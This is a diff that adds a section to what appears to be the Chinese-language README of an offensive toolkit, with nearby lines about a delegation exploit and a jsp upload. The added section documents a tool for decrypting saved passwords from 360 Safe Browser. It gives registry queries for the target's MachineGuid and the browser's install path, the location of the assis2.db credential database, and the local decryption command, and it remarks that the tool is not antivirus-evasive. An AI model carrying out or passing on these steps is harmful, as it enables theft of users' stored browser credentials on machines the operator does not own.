@@ -186,3 +186,30 @@ xxxx.exe c:\wwww\upload\1.jsp
 ### 4. 视频演示
 
 ![](./delegationVul/imgs/基于资源的约束委派利用.gif)
+
+## 0x12. 360SafeBrowserDecrypt
+
+功能：
+
+```
+直接在目标机器上运行，但是不免杀
+360SafeBrowserDecrypt.exe
+
+将目标的机器id和assis2.db数据库拖回到本地解密
+查机器id:
+reg query "HKLM\SOFTWARE\MICROSOFT\CRYPTOGRAPHY" /v "MachineGuid"
+查360安全浏览器安装目录: 
+reg query "HKCR\360SeSES\DefaultIcon"
+默认的assis2.db数据库目录:
+C:\Users\xxxxxxx\AppData\Roaming\360se6\User Data\Default\apps\LoginAssis
+
+本地运行:
+360SafeBrowserDecrypt.exe xxx-xxx-xxx-xxx assis2.db
+
+
+结果显示:
+有收藏夹的url和保存密码的url
+```
+
+![](./imgs/360SafeBrowserDecrypt.png)
+
